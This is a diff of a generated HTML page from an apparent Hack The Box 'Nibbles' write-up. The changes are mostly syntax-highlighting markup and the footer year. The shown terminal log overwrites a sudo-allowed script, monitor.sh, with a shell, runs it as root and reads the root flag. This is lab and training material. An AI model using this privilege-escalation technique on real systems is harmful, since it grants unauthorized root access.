-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nibbler@Nibbles:/$ <span style="color:#8be9fd;font-style:italic">echo</span> -e <span style="color:#f1fa8c">&#39;#!/bin/sh\n/bin/sh&#39;</span> &gt;  /home/nibbler/personal/stuff/monitor.sh
-&lt;<span style="color:#f1fa8c">&#39;#!/bin/sh\n/bin/sh&#39;</span> &gt;  /home/nibbler/personal/stuff/monitor.sh
-nibbler@Nibbles:/$ sudo /home/nibbler/personal/stuff/monitor.sh
-sudo /home/nibbler/personal/stuff/monitor.sh
-id
-id
-<span style="color:#8be9fd;font-style:italic">pwd</span>
-<span style="color:#8be9fd;font-style:italic">pwd</span>
-sudo: unable to resolve host Nibbles: Connection timed out
-<span style="color:#6272a4"># uid=0(root) gid=0(root) groups=0(root)</span>
-<span style="color:#6272a4"># /</span>
-<span style="color:#6272a4"># cat /root/root.txt</span>
-cat /root/root.txt
-<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nibbler@Nibbles:/$ <span style="color:#8be9fd;font-style:italic">echo</span> -e <span style="color:#f1fa8c">&#39;#!/bin/sh\n/bin/sh&#39;</span> &gt;  /home/nibbler/personal/stuff/monitor.sh
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f1fa8c">&#39;#!/bin/sh\n/bin/sh&#39;</span> &gt;  /home/nibbler/personal/stuff/monitor.sh
+</span></span><span style="display:flex;"><span>nibbler@Nibbles:/$ sudo /home/nibbler/personal/stuff/monitor.sh
+</span></span><span style="display:flex;"><span>sudo /home/nibbler/personal/stuff/monitor.sh
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">pwd</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">pwd</span>
+</span></span><span style="display:flex;"><span>sudo: unable to resolve host Nibbles: Connection timed out
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># uid=0(root) gid=0(root) groups=0(root)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># /</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># cat /root/root.txt</span>
+</span></span><span style="display:flex;"><span>cat /root/root.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div>
       </div>
@@ -794,7 +794,7 @@ cat /root/root.txt
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2022</span>
             
             <span><a href="https://0xade1.github.io/devdraft/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
